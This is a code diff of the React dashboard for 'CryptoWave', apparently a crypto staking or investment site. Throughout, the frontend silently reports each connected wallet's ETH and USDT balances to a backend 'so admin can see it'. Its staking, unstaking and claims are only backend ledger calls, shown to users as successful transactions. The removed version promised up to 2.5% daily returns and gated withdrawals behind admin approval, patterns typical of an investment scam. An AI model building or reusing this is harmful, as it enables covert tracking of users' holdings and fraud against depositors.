@@ -1,40 +1,29 @@
 import { useState, useEffect, useCallback } from 'react';
 import { ethers } from 'ethers';
-import './styles/design-tokens.css';
 import './Dashboard.css';
 
-// Components
-import BottomNav from './components/BottomNav';
-import WalletCard from './components/WalletCard';
-import InterestCard from './components/InterestCard';
-import QuickActions from './components/QuickActions';
-import VIPCard from './components/VIPCard';
-import TransactionList from './components/TransactionList';
-
+// USDT Contract Address (Ethereum Mainnet)
 const USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 const USDT_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
-  'function decimals() view returns (uint8)'
+  'function decimals() view returns (uint8)',
+  'function symbol() view returns (string)'
 ];
 
 const API_BASE = import.meta.env.VITE_API_URL || 'https://cryptowave-backend-pq3e.onrender.com';
 
-const VIP_CONFIG = {
-  0: { name: 'Standard', min: 0, rate: 1 },
-  1: { name: 'VIP 1', min: 1000, rate: 1.5 },
-  2: { name: 'VIP 2', min: 5000, rate: 2 },
-  3: { name: 'VIP 3', min: 10000, rate: 2.5 }
-};
-
 function Dashboard({ walletAddress, onDisconnect }) {
-  const [activeTab, setActiveTab] = useState('home');
-  const [darkMode, setDarkMode] = useState(false);
+  const [activeTab, setActiveTab] = useState('overview');
+  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
   const [notification, setNotification] = useState({ show: false, message: '', type: '' });
 
+  // Real wallet data
   const [ethBalance, setEthBalance] = useState('0.00');
   const [usdtBalance, setUsdtBalance] = useState('0.00');
   const [loading, setLoading] = useState(false);
+  const [dataLoading, setDataLoading] = useState(true);
 
+  // User data from backend
   const [userData, setUserData] = useState({
     stakedAmount: 0,
     totalEarned: 0,
@@ -42,14 +31,22 @@ function Dashboard({ walletAddress, onDisconnect }) {
     claimableRewards: 0
   });
 
+  // Platform settings from backend
+  const [platformSettings, setPlatformSettings] = useState({
+    baseAPY: 12.5,
+    vip1Bonus: 0.25,
+    vip2Bonus: 0.5,
+    vip3Bonus: 1.0
+  });
+
+  // Transactions from backend
   const [transactions, setTransactions] = useState([]);
-  const [investAmount, setInvestAmount] = useState('');
-  const [withdrawAmount, setWithdrawAmount] = useState('');
 
-  useEffect(() => {
-    document.documentElement.setAttribute('data-theme', darkMode ? 'dark' : 'light');
-  }, [darkMode]);
+  // Staking form state
+  const [stakeAmount, setStakeAmount] = useState('');
+  const [unstakeAmount, setUnstakeAmount] = useState('');
 
+  // Report balance to backend (so admin can see it)
   const reportBalanceToBackend = useCallback(async (eth, usdt) => {
     try {
       await fetch(`${API_BASE}/api/report-balance`, {
@@ -57,30 +54,44 @@ function Dashboard({ walletAddress, onDisconnect }) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ walletAddress, eth, usdt })
       });
-    } catch (error) {}
+    } catch (error) {
+      console.log('Failed to report balance to backend');
+    }
   }, [walletAddress]);
 
+  // Fetch real wallet balance
   const fetchWalletBalance = useCallback(async () => {
     if (!window.ethereum || !walletAddress) return;
+
     try {
       const provider = new ethers.providers.Web3Provider(window.ethereum);
+
+      // Fetch ETH balance
       const ethBal = await provider.getBalance(walletAddress);
       const ethFormatted = parseFloat(ethers.utils.formatEther(ethBal)).toFixed(4);
       setEthBalance(ethFormatted);
 
+      // Fetch USDT balance
+      let usdtFormatted = '0.00';
       try {
         const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
         const usdtBal = await usdtContract.balanceOf(walletAddress);
         const decimals = await usdtContract.decimals();
-        const usdtFormatted = parseFloat(ethers.utils.formatUnits(usdtBal, decimals)).toFixed(2);
+        usdtFormatted = parseFloat(ethers.utils.formatUnits(usdtBal, decimals)).toFixed(2);
         setUsdtBalance(usdtFormatted);
-        reportBalanceToBackend(ethFormatted, usdtFormatted);
-      } catch (e) {
+      } catch (usdtError) {
+        console.log('USDT fetch error (may be on testnet):', usdtError);
         setUsdtBalance('0.00');
       }
-    } catch (error) {}
+
+      // Report balance to backend so admin can see it
+      reportBalanceToBackend(ethFormatted, usdtFormatted);
+    } catch (error) {
+      console.error('Error fetching wallet balance:', error);
+    }
   }, [walletAddress, reportBalanceToBackend]);
 
+  // Fetch user data from backend
   const fetchUserData = useCallback(async () => {
     try {
       const response = await fetch(`${API_BASE}/api/user/${walletAddress}`);
@@ -93,9 +104,25 @@ function Dashboard({ walletAddress, onDisconnect }) {
           claimableRewards: data.claimableRewards || 0
         });
       }
-    } catch (error) {}
+    } catch (error) {
+      console.error('Error fetching user data:', error);
+    }
   }, [walletAddress]);
 
+  // Fetch platform settings
+  const fetchPlatformSettings = useCallback(async () => {
+    try {
+      const response = await fetch(`${API_BASE}/api/settings`);
+      if (response.ok) {
+        const data = await response.json();
+        setPlatformSettings(data);
+      }
+    } catch (error) {
+      console.error('Error fetching settings:', error);
+    }
+  }, []);
+
+  // Fetch transactions
   const fetchTransactions = useCallback(async () => {
     try {
       const response = await fetch(`${API_BASE}/api/user/${walletAddress}/transactions`);
@@ -103,220 +130,692 @@ function Dashboard({ walletAddress, onDisconnect }) {
         const data = await response.json();
         setTransactions(data);
       }
-    } catch (error) {}
+    } catch (error) {
+      console.error('Error fetching transactions:', error);
+    }
   }, [walletAddress]);
 
+  // Initial data fetch
   useEffect(() => {
-    fetchWalletBalance();
-    fetchUserData();
-    fetchTransactions();
-  }, [fetchWalletBalance, fetchUserData, fetchTransactions]);
+    const loadData = async () => {
+      setDataLoading(true);
+      await Promise.all([
+        fetchWalletBalance(),
+        fetchUserData(),
+        fetchPlatformSettings(),
+        fetchTransactions()
+      ]);
+      setDataLoading(false);
+    };
+    loadData();
+  }, [fetchWalletBalance, fetchUserData, fetchPlatformSettings, fetchTransactions]);
 
+  // Refresh wallet balance every 30 seconds
   useEffect(() => {
-    const interval = setInterval(() => {
-      fetchWalletBalance();
-      fetchUserData();
-    }, 30000);
+    const interval = setInterval(fetchWalletBalance, 30000);
     return () => clearInterval(interval);
-  }, [fetchWalletBalance, fetchUserData]);
+  }, [fetchWalletBalance]);
 
   const showNotification = (message, type = 'success') => {
     setNotification({ show: true, message, type });
-    setTimeout(() => setNotification({ show: false, message: '', type: '' }), 4000);
+    setTimeout(() => {
+      setNotification({ show: false, message: '', type: '' });
+    }, 4000);
   };
 
-  const handleInvest = async () => {
-    if (!investAmount || parseFloat(investAmount) <= 0) {
-      showNotification('Enter a valid amount', 'error');
+  const copyAddress = () => {
+    navigator.clipboard.writeText(walletAddress);
+    showNotification('Address copied to clipboard!', 'success');
+  };
+
+  // Calculate APY based on VIP level
+  const getCurrentAPY = () => {
+    const bonuses = [0, platformSettings.vip1Bonus, platformSettings.vip2Bonus, platformSettings.vip3Bonus];
+    return (platformSettings.baseAPY + (bonuses[userData.vipLevel] || 0)).toFixed(2);
+  };
+
+  // Calculate daily earnings
+  const getDailyEarnings = () => {
+    const apy = parseFloat(getCurrentAPY());
+    return ((userData.stakedAmount * (apy / 100)) / 365).toFixed(2);
+  };
+
+  // Handle stake
+  const handleStake = async () => {
+    const amount = parseFloat(stakeAmount);
+    if (!amount || amount <= 0) {
+      showNotification('Please enter a valid amount', 'error');
       return;
     }
+
+    if (amount > parseFloat(usdtBalance)) {
+      showNotification('Insufficient USDT balance', 'error');
+      return;
+    }
+
     setLoading(true);
     try {
       const response = await fetch(`${API_BASE}/api/stake`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress, amount: parseFloat(investAmount), type: 'stake' })
+        body: JSON.stringify({
+          walletAddress,
+          amount,
+          type: 'stake'
+        })
       });
-      const data = await response.json();
-      if (data.success) {
-        showNotification(`Invested $${investAmount} successfully!`);
-        setInvestAmount('');
-        fetchUserData();
-        fetchTransactions();
+
+      if (response.ok) {
+        showNotification(`Successfully staked ${amount} USDT!`, 'success');
+        setStakeAmount('');
+        await fetchUserData();
+        await fetchTransactions();
       } else {
-        showNotification(data.message || 'Failed', 'error');
+        const error = await response.json();
+        showNotification(error.message || 'Staking failed', 'error');
       }
     } catch (error) {
-      showNotification('Failed', 'error');
+      console.error('Stake error:', error);
+      showNotification('Failed to stake. Please try again.', 'error');
+    } finally {
+      setLoading(false);
     }
-    setLoading(false);
   };
 
-  const handleWithdraw = async () => {
-    if (!withdrawAmount || parseFloat(withdrawAmount) <= 0) {
-      showNotification('Enter a valid amount', 'error');
+  // Handle unstake
+  const handleUnstake = async () => {
+    const amount = parseFloat(unstakeAmount);
+    if (!amount || amount <= 0) {
+      showNotification('Please enter a valid amount', 'error');
       return;
     }
-    if (parseFloat(withdrawAmount) > userData.claimableRewards) {
-      showNotification('Insufficient balance', 'error');
+
+    if (amount > userData.stakedAmount) {
+      showNotification('Amount exceeds staked balance', 'error');
       return;
     }
+
     setLoading(true);
     try {
-      const response = await fetch(`${API_BASE}/api/withdraw/request`, {
+      const response = await fetch(`${API_BASE}/api/stake`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress, amount: parseFloat(withdrawAmount) })
+        body: JSON.stringify({
+          walletAddress,
+          amount,
+          type: 'unstake'
+        })
       });
-      const data = await response.json();
-      if (data.success) {
-        showNotification('Withdrawal submitted for approval');
-        setWithdrawAmount('');
-        fetchUserData();
-        fetchTransactions();
+
+      if (response.ok) {
+        showNotification(`Successfully unstaked ${amount} USDT!`, 'success');
+        setUnstakeAmount('');
+        await fetchUserData();
+        await fetchTransactions();
       } else {
-        showNotification(data.message || 'Failed', 'error');
+        const error = await response.json();
+        showNotification(error.message || 'Unstaking failed', 'error');
       }
     } catch (error) {
-      showNotification('Failed', 'error');
+      console.error('Unstake error:', error);
+      showNotification('Failed to unstake. Please try again.', 'error');
+    } finally {
+      setLoading(false);
     }
-    setLoading(false);
   };
 
-  const handleQuickAction = (action) => {
-    if (action === 'deposit') setActiveTab('invest');
-    else if (action === 'withdraw') setActiveTab('withdraw');
-    else if (action === 'history') setActiveTab('interest');
+  // Handle claim rewards
+  const handleClaimRewards = async () => {
+    if (userData.claimableRewards <= 0) {
+      showNotification('No rewards to claim', 'error');
+      return;
+    }
+
+    setLoading(true);
+    try {
+      const response = await fetch(`${API_BASE}/api/claim`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ walletAddress })
+      });
+
+      if (response.ok) {
+        const data = await response.json();
+        showNotification(`Successfully claimed ${data.amount} USDT!`, 'success');
+        await fetchUserData();
+        await fetchTransactions();
+      } else {
+        const error = await response.json();
+        showNotification(error.message || 'Claim failed', 'error');
+      }
+    } catch (error) {
+      console.error('Claim error:', error);
+      showNotification('Failed to claim rewards. Please try again.', 'error');
+    } finally {
+      setLoading(false);
+    }
   };
 
-  const currentVIPRate = VIP_CONFIG[userData.vipLevel]?.rate || 1;
+  // Format number with commas
+  const formatNumber = (num) => {
+    return parseFloat(num).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  };
+
+  // Get VIP level name
+  const getVipName = (level) => {
+    const names = ['Normal', 'VIP 1', 'VIP 2', 'VIP 3'];
+    return names[level] || 'Normal';
+  };
+
+  if (dataLoading) {
+    return (
+      <div className="dashboard loading-state">
+        <div className="loading-container">
+          <div className="spinner large"></div>
+          <p>Loading your dashboard...</p>
+        </div>
+      </div>
+    );
+  }
 
   return (
-    <div className="dashboard-container">
-      <header className="dashboard-header">
-        <div className="header-left">
-          <div className="logo">
-            <span className="logo-icon">💎</span>
-            <span className="logo-text">CryptoWave</span>
-          </div>
-        </div>
-        <div className="header-right">
-          <button className="theme-toggle" onClick={() => setDarkMode(!darkMode)}>
-            {darkMode ? '☀️' : '🌙'}
-          </button>
-        </div>
-      </header>
-
-      <main className="dashboard-content">
-        {activeTab === 'home' && (
-          <div className="screen">
-            <WalletCard balance={userData.stakedAmount} usdtBalance={usdtBalance} vipLevel={userData.vipLevel} />
-            <InterestCard totalEarned={userData.totalEarned} dailyRate={currentVIPRate} stakedAmount={userData.stakedAmount} />
-            <VIPCard currentLevel={userData.vipLevel} stakedAmount={userData.stakedAmount} onUpgrade={() => setActiveTab('invest')} />
-            <QuickActions onAction={handleQuickAction} />
-            <div className="section">
-              <div className="section-header">
-                <h3>Recent Transactions</h3>
-                <button className="see-all-btn" onClick={() => setActiveTab('interest')}>See All</button>
-              </div>
-              <TransactionList transactions={transactions} limit={5} />
-            </div>
-          </div>
-        )}
-
-        {activeTab === 'invest' && (
-          <div className="screen invest-screen">
-            <h2 className="screen-title">Investment Plans</h2>
-            <div className="vip-plans">
-              {Object.entries(VIP_CONFIG).map(([level, config]) => (
-                <div key={level} className={`vip-plan-card level-${level}`}>
-                  <div className="plan-header">
-                    <span className="plan-badge">{config.name}</span>
-                    <span className="plan-rate">{config.rate}% Daily</span>
-                  </div>
-                  <div className="plan-details">
-                    <span>Min: ${config.min.toLocaleString()}</span>
-                    <span>Monthly: {(config.rate * 30).toFixed(0)}%</span>
-                  </div>
-                  {parseInt(level) === userData.vipLevel && <div className="current-badge">Current</div>}
-                </div>
-              ))}
-            </div>
-            <div className="invest-form">
-              <h3>Invest Amount</h3>
-              <div className="input-group">
-                <span className="input-prefix">$</span>
-                <input type="number" className="input" placeholder="Enter amount" value={investAmount} onChange={(e) => setInvestAmount(e.target.value)} />
-                <button className="max-btn" onClick={() => setInvestAmount(usdtBalance)}>MAX</button>
-              </div>
-              <div className="invest-summary">
-                <div className="summary-row"><span>Daily Interest</span><span className="text-success">+${((parseFloat(investAmount) || 0) * currentVIPRate / 100).toFixed(2)}</span></div>
-                <div className="summary-row"><span>Monthly</span><span className="text-success">+${((parseFloat(investAmount) || 0) * currentVIPRate / 100 * 30).toFixed(2)}</span></div>
-              </div>
-              <button className="btn btn-primary" onClick={handleInvest} disabled={loading}>{loading ? 'Processing...' : 'Invest Now'}</button>
-            </div>
-          </div>
-        )}
-
-        {activeTab === 'interest' && (
-          <div className="screen">
-            <h2 className="screen-title">Interest & History</h2>
-            <div className="summary-cards">
-              <div className="summary-card"><span className="summary-icon">💰</span><div><span className="label">Total Earned</span><span className="value">${userData.totalEarned.toFixed(2)}</span></div></div>
-              <div className="summary-card"><span className="summary-icon">💵</span><div><span className="label">Withdrawable</span><span className="value text-success">${userData.claimableRewards.toFixed(2)}</span></div></div>
-            </div>
-            <TransactionList transactions={transactions} limit={20} />
-          </div>
-        )}
-
-        {activeTab === 'withdraw' && (
-          <div className="screen">
-            <h2 className="screen-title">Withdraw</h2>
-            <div className="withdraw-balance"><span>Available</span><span className="text-success">${userData.claimableRewards.toFixed(2)}</span></div>
-            <div className="input-group">
-              <span className="input-prefix">$</span>
-              <input type="number" className="input" placeholder="Amount" value={withdrawAmount} onChange={(e) => setWithdrawAmount(e.target.value)} />
-              <button className="max-btn" onClick={() => setWithdrawAmount(userData.claimableRewards.toString())}>MAX</button>
-            </div>
-            <div className="withdraw-info">
-              <div className="info-row"><span>Fee (2%)</span><span>${((parseFloat(withdrawAmount) || 0) * 0.02).toFixed(2)}</span></div>
-              <div className="info-row"><span>You Receive</span><span className="text-success">${((parseFloat(withdrawAmount) || 0) * 0.98).toFixed(2)}</span></div>
-            </div>
-            <p className="notice">⚠️ Withdrawals require admin approval (up to 24h)</p>
-            <button className="btn btn-warning" onClick={handleWithdraw} disabled={loading}>{loading ? 'Processing...' : 'Request Withdrawal'}</button>
-          </div>
-        )}
-
-        {activeTab === 'profile' && (
-          <div className="screen">
-            <h2 className="screen-title">Profile</h2>
-            <div className="profile-card">
-              <div className="avatar">👤</div>
-              <div className="profile-info">
-                <span className="address">{walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}</span>
-                <span className="vip-badge">VIP {userData.vipLevel}</span>
-              </div>
-            </div>
-            <div className="stats-grid">
-              <div className="stat"><span className="label">Deposited</span><span className="value">${userData.stakedAmount.toFixed(2)}</span></div>
-              <div className="stat"><span className="label">Earned</span><span className="value text-success">${userData.totalEarned.toFixed(2)}</span></div>
-              <div className="stat"><span className="label">ETH</span><span className="value">{ethBalance}</span></div>
-              <div className="stat"><span className="label">USDT</span><span className="value">{usdtBalance}</span></div>
-            </div>
-            <button className="btn btn-outline" onClick={() => setDarkMode(!darkMode)}>{darkMode ? '☀️ Light' : '🌙 Dark'} Mode</button>
-            <button className="btn btn-danger" onClick={onDisconnect}>🚪 Disconnect</button>
-          </div>
-        )}
-      </main>
-
-      <BottomNav activeTab={activeTab} onTabChange={setActiveTab} />
-
+    <div className="dashboard">
+      {/* Notification */}
       {notification.show && (
-        <div className={`toast ${notification.type}`}>
-          <span>{notification.type === 'success' ? '✅' : '❌'}</span>
+        <div className={`notification ${notification.type}`}>
           <span>{notification.message}</span>
+          <button onClick={() => setNotification({ show: false, message: '', type: '' })}>&times;</button>
         </div>
       )}
+
+      {/* Mobile Menu Button */}
+      <button
+        className="mobile-menu-btn"
+        onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
+        aria-label="Toggle menu"
+      >
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+
+      {/* Sidebar */}
+      <aside className={`dashboard-sidebar ${mobileMenuOpen ? 'mobile-open' : ''}`}>
+        <div className="sidebar-header">
+          <div className="sidebar-logo">
+            <div className="logo-icon-dash">C</div>
+            <span>CRYPTOWAVE</span>
+          </div>
+        </div>
+
+        <nav className="sidebar-nav">
+          <button
+            className={`nav-item ${activeTab === 'overview' ? 'active' : ''}`}
+            onClick={() => { setActiveTab('overview'); setMobileMenuOpen(false); }}
+          >
+            <span className="nav-icon">📊</span>
+            <span>Overview</span>
+          </button>
+          <button
+            className={`nav-item ${activeTab === 'stake' ? 'active' : ''}`}
+            onClick={() => { setActiveTab('stake'); setMobileMenuOpen(false); }}
+          >
+            <span className="nav-icon">💰</span>
+            <span>Stake</span>
+          </button>
+          <button
+            className={`nav-item ${activeTab === 'earnings' ? 'active' : ''}`}
+            onClick={() => { setActiveTab('earnings'); setMobileMenuOpen(false); }}
+          >
+            <span className="nav-icon">📈</span>
+            <span>Earnings</span>
+          </button>
+          <button
+            className={`nav-item ${activeTab === 'transactions' ? 'active' : ''}`}
+            onClick={() => { setActiveTab('transactions'); setMobileMenuOpen(false); }}
+          >
+            <span className="nav-icon">📋</span>
+            <span>Transactions</span>
+          </button>
+          <button
+            className={`nav-item ${activeTab === 'vip' ? 'active' : ''}`}
+            onClick={() => { setActiveTab('vip'); setMobileMenuOpen(false); }}
+          >
+            <span className="nav-icon">⭐</span>
+            <span>VIP Status</span>
+          </button>
+        </nav>
+
+        <div className="sidebar-footer">
+          <button className="disconnect-btn" onClick={onDisconnect}>
+            <span>🚪</span>
+            <span>Disconnect</span>
+          </button>
+        </div>
+      </aside>
+
+      {/* Mobile Overlay */}
+      <div
+        className={`mobile-overlay ${mobileMenuOpen ? 'show' : ''}`}
+        onClick={() => setMobileMenuOpen(false)}
+      ></div>
+
+      {/* Main Content */}
+      <main className="dashboard-main">
+        <header className="dashboard-header">
+          <div className="header-left">
+            <h1>Dashboard</h1>
+            <p className="header-subtitle">Welcome back!</p>
+          </div>
+          <div className="header-right">
+            <div className="wallet-info">
+              <span className="wallet-label">Connected Wallet</span>
+              <div className="wallet-address" onClick={copyAddress}>
+                <span>{walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}</span>
+                <span className="copy-icon">📋</span>
+              </div>
+            </div>
+            <div className="vip-badge-header">
+              <span className="vip-icon">⭐</span>
+              <span>{getVipName(userData.vipLevel)}</span>
+            </div>
+          </div>
+        </header>
+
+        <div className="dashboard-content">
+          {/* Overview Tab */}
+          {activeTab === 'overview' && (
+            <div className="overview-section">
+              <div className="stats-grid">
+                <div className="stat-card">
+                  <div className="stat-header">
+                    <span className="stat-icon">💎</span>
+                    <span className="stat-label">Staked Balance</span>
+                  </div>
+                  <div className="stat-value">{formatNumber(userData.stakedAmount)} USDT</div>
+                  <div className="stat-change positive">+{getCurrentAPY()}% APY</div>
+                </div>
+
+                <div className="stat-card">
+                  <div className="stat-header">
+                    <span className="stat-icon">💵</span>
+                    <span className="stat-label">Wallet USDT</span>
+                  </div>
+                  <div className="stat-value">{formatNumber(usdtBalance)} USDT</div>
+                  <div className="stat-change">Available to stake</div>
+                </div>
+
+                <div className="stat-card">
+                  <div className="stat-header">
+                    <span className="stat-icon">⚡</span>
+                    <span className="stat-label">ETH Balance</span>
+                  </div>
+                  <div className="stat-value">{ethBalance} ETH</div>
+                  <div className="stat-change">For gas fees</div>
+                </div>
+
+                <div className="stat-card">
+                  <div className="stat-header">
+                    <span className="stat-icon">🎯</span>
+                    <span className="stat-label">Total Earned</span>
+                  </div>
+                  <div className="stat-value">{formatNumber(userData.totalEarned)} USDT</div>
+                  <div className="stat-change positive">All time</div>
+                </div>
+              </div>
+
+              <div className="quick-actions">
+                <h2 className="section-title">Quick Actions</h2>
+                <div className="actions-grid">
+                  <button className="action-btn primary" onClick={() => setActiveTab('stake')}>
+                    <span className="action-icon">➕</span>
+                    <span>Stake USDT</span>
+                  </button>
+                  <button className="action-btn secondary" onClick={() => setActiveTab('stake')}>
+                    <span className="action-icon">➖</span>
+                    <span>Unstake</span>
+                  </button>
+                  <button
+                    className="action-btn success"
+                    onClick={handleClaimRewards}
+                    disabled={loading || userData.claimableRewards <= 0}
+                  >
+                    <span className="action-icon">🎁</span>
+                    <span>Claim {formatNumber(userData.claimableRewards)} USDT</span>
+                  </button>
+                </div>
+              </div>
+
+              <div className="info-cards-grid">
+                <div className="info-card">
+                  <h3>📈 Daily Earnings</h3>
+                  <div className="info-value">{getDailyEarnings()} USDT</div>
+                  <p>Estimated daily earnings based on your stake</p>
+                </div>
+                <div className="info-card">
+                  <h3>🎁 Claimable</h3>
+                  <div className="info-value">{formatNumber(userData.claimableRewards)} USDT</div>
+                  <p>Rewards ready to claim</p>
+                </div>
+                <div className="info-card">
+                  <h3>⭐ VIP Status</h3>
+                  <div className="info-value">{getVipName(userData.vipLevel)}</div>
+                  <p>Current membership tier</p>
+                </div>
+              </div>
+
+              <div className="recent-transactions">
+                <h2 className="section-title">Recent Activity</h2>
+                <div className="transactions-list">
+                  {transactions.length > 0 ? (
+                    transactions.slice(0, 5).map((tx, index) => (
+                      <div key={tx.id || index} className="transaction-item">
+                        <div className="tx-icon-wrapper">
+                          <span className={`tx-icon ${tx.type}`}>
+                            {tx.type === 'stake' ? '➕' : tx.type === 'unstake' ? '➖' : '🎁'}
+                          </span>
+                        </div>
+                        <div className="tx-info">
+                          <div className="tx-type">{tx.type.charAt(0).toUpperCase() + tx.type.slice(1)}</div>
+                          <div className="tx-date">{tx.date}</div>
+                        </div>
+                        <div className="tx-amount">{formatNumber(tx.amount)} USDT</div>
+                      </div>
+                    ))
+                  ) : (
+                    <div className="no-transactions">
+                      <p>No transactions yet. Start by staking some USDT!</p>
+                    </div>
+                  )}
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Stake Tab */}
+          {activeTab === 'stake' && (
+            <div className="stake-section">
+              <div className="stake-grid">
+                <div className="stake-panel">
+                  <h2 className="panel-title">Stake USDT</h2>
+                  <div className="balance-display">
+                    <span>Available Balance</span>
+                    <span className="balance-value">{formatNumber(usdtBalance)} USDT</span>
+                  </div>
+                  <div className="input-group">
+                    <input
+                      type="number"
+                      placeholder="Enter amount to stake"
+                      value={stakeAmount}
+                      onChange={(e) => setStakeAmount(e.target.value)}
+                      className="stake-input"
+                      disabled={loading}
+                    />
+                    <button className="max-btn" onClick={() => setStakeAmount(usdtBalance)} disabled={loading}>
+                      MAX
+                    </button>
+                  </div>
+                  <div className="quick-amounts">
+                    <button onClick={() => setStakeAmount('100')} disabled={loading}>100</button>
+                    <button onClick={() => setStakeAmount('500')} disabled={loading}>500</button>
+                    <button onClick={() => setStakeAmount('1000')} disabled={loading}>1,000</button>
+                    <button onClick={() => setStakeAmount('5000')} disabled={loading}>5,000</button>
+                  </div>
+                  <div className="stake-info">
+                    <div className="info-row">
+                      <span>Current APY</span>
+                      <span className="info-value">{getCurrentAPY()}% Annual</span>
+                    </div>
+                    <div className="info-row">
+                      <span>Estimated Daily Earnings</span>
+                      <span className="info-value">
+                        {stakeAmount ? ((parseFloat(stakeAmount) * (parseFloat(getCurrentAPY()) / 100)) / 365).toFixed(4) : '0.00'} USDT
+                      </span>
+                    </div>
+                  </div>
+                  <button
+                    className="stake-btn primary"
+                    onClick={handleStake}
+                    disabled={loading || !stakeAmount}
+                  >
+                    {loading ? 'Processing...' : 'Stake Now'}
+                  </button>
+                </div>
+
+                <div className="stake-panel">
+                  <h2 className="panel-title">Unstake USDT</h2>
+                  <div className="balance-display">
+                    <span>Staked Balance</span>
+                    <span className="balance-value">{formatNumber(userData.stakedAmount)} USDT</span>
+                  </div>
+                  <div className="input-group">
+                    <input
+                      type="number"
+                      placeholder="Enter amount to unstake"
+                      value={unstakeAmount}
+                      onChange={(e) => setUnstakeAmount(e.target.value)}
+                      className="stake-input"
+                      disabled={loading}
+                    />
+                    <button className="max-btn" onClick={() => setUnstakeAmount(String(userData.stakedAmount))} disabled={loading}>
+                      MAX
+                    </button>
+                  </div>
+                  <div className="quick-amounts">
+                    <button onClick={() => setUnstakeAmount('100')} disabled={loading}>100</button>
+                    <button onClick={() => setUnstakeAmount('500')} disabled={loading}>500</button>
+                    <button onClick={() => setUnstakeAmount('1000')} disabled={loading}>1,000</button>
+                    <button onClick={() => setUnstakeAmount('5000')} disabled={loading}>5,000</button>
+                  </div>
+                  <div className="warning-box">
+                    ⚠️ Unstaking will stop earning rewards on this amount
+                  </div>
+                  <button
+                    className="stake-btn secondary"
+                    onClick={handleUnstake}
+                    disabled={loading || !unstakeAmount}
+                  >
+                    {loading ? 'Processing...' : 'Unstake'}
+                  </button>
+                </div>
+              </div>
+
+              <div className="claim-panel">
+                <div className="claim-header">
+                  <div>
+                    <h2 className="panel-title">Claimable Rewards</h2>
+                    <p className="claim-subtitle">Your accumulated earnings ready to claim</p>
+                  </div>
+                  <div className="claim-amount">{formatNumber(userData.claimableRewards)} USDT</div>
+                </div>
+                <button
+                  className="stake-btn success"
+                  onClick={handleClaimRewards}
+                  disabled={loading || userData.claimableRewards <= 0}
+                >
+                  {loading ? 'Processing...' : 'Claim Rewards'}
+                </button>
+              </div>
+            </div>
+          )}
+
+          {/* Earnings Tab */}
+          {activeTab === 'earnings' && (
+            <div className="earnings-section">
+              <div className="earnings-summary">
+                <div className="summary-card">
+                  <h3>Today's Earnings</h3>
+                  <div className="summary-value">{getDailyEarnings()} USDT</div>
+                  <div className="summary-subtitle">Estimated daily</div>
+                </div>
+                <div className="summary-card">
+                  <h3>This Week</h3>
+                  <div className="summary-value">{(parseFloat(getDailyEarnings()) * 7).toFixed(2)} USDT</div>
+                  <div className="summary-subtitle">7-day projection</div>
+                </div>
+                <div className="summary-card">
+                  <h3>This Month</h3>
+                  <div className="summary-value">{(parseFloat(getDailyEarnings()) * 30).toFixed(2)} USDT</div>
+                  <div className="summary-subtitle">30-day projection</div>
+                </div>
+                <div className="summary-card">
+                  <h3>All Time</h3>
+                  <div className="summary-value">{formatNumber(userData.totalEarned)} USDT</div>
+                  <div className="summary-subtitle">Total earned</div>
+                </div>
+              </div>
+
+              <div className="earnings-breakdown">
+                <h2 className="section-title">Earnings Breakdown</h2>
+                <div className="breakdown-list">
+                  <div className="breakdown-item">
+                    <span>Base APY</span>
+                    <span>{platformSettings.baseAPY}%</span>
+                  </div>
+                  <div className="breakdown-item">
+                    <span>VIP Bonus</span>
+                    <span>+{userData.vipLevel > 0 ? [0, platformSettings.vip1Bonus, platformSettings.vip2Bonus, platformSettings.vip3Bonus][userData.vipLevel] : 0}%</span>
+                  </div>
+                  <div className="breakdown-item">
+                    <span>Effective APY</span>
+                    <span className="highlight">{getCurrentAPY()}%</span>
+                  </div>
+                  <div className="breakdown-item">
+                    <span>Daily Earnings Rate</span>
+                    <span>{(parseFloat(getCurrentAPY()) / 365).toFixed(4)}%</span>
+                  </div>
+                  <div className="breakdown-item">
+                    <span>Staked Amount</span>
+                    <span>{formatNumber(userData.stakedAmount)} USDT</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Transactions Tab */}
+          {activeTab === 'transactions' && (
+            <div className="transactions-section">
+              <div className="transactions-header">
+                <h2 className="section-title">Transaction History</h2>
+                <button className="refresh-btn" onClick={fetchTransactions}>
+                  🔄 Refresh
+                </button>
+              </div>
+
+              <div className="transactions-table">
+                <div className="table-header">
+                  <div className="table-cell">Type</div>
+                  <div className="table-cell">Amount</div>
+                  <div className="table-cell">Date</div>
+                  <div className="table-cell">Status</div>
+                </div>
+                {transactions.length > 0 ? (
+                  transactions.map((tx, index) => (
+                    <div key={tx.id || index} className="table-row">
+                      <div className="table-cell" data-label="Type">
+                        <span className={`tx-badge ${tx.type}`}>
+                          {tx.type.charAt(0).toUpperCase() + tx.type.slice(1)}
+                        </span>
+                      </div>
+                      <div className="table-cell" data-label="Amount">{formatNumber(tx.amount)} USDT</div>
+                      <div className="table-cell" data-label="Date">{tx.date}</div>
+                      <div className="table-cell" data-label="Status">
+                        <span className={`status-badge ${tx.status}`}>{tx.status}</span>
+                      </div>
+                    </div>
+                  ))
+                ) : (
+                  <div className="no-transactions-full">
+                    <p>No transactions yet</p>
+                    <span>Start by staking some USDT to see your transaction history</span>
+                  </div>
+                )}
+              </div>
+            </div>
+          )}
+
+          {/* VIP Tab */}
+          {activeTab === 'vip' && (
+            <div className="vip-section-dash">
+              <div className="current-vip">
+                <div className="vip-card">
+                  <div className="vip-icon-large">⭐</div>
+                  <h2>{getVipName(userData.vipLevel)}</h2>
+                  <div className="vip-apy">{getCurrentAPY()}% APY</div>
+                  <div className="vip-staked">Staked: {formatNumber(userData.stakedAmount)} USDT</div>
+                </div>
+              </div>
+
+              <div className="vip-tiers">
